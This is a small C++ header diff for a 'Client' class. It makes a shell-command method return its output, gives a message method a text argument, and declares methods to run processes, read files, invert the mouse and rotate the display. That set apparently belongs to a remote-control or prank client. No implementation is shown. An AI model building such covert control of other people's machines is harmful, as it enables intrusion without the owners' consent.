@@ -8,7 +8,7 @@ public:
 	Client();
 	//Process Execution
 	void startProcess(const std::string &);
-	void runCmdCommand(const std::string &);
+	std::string runCmdCommand(const std::string &);
 
 	//File Handling
 	std::string readFile(const std::string &);
@@ -18,8 +18,9 @@ public:
 	//Funny stuff
 	virtual void run();
 	void toggleInvertMouse();
+
 	void rotateDisplay();
-	void message();
+	void message(const std::string &);
 
 	virtual ~Client();
 
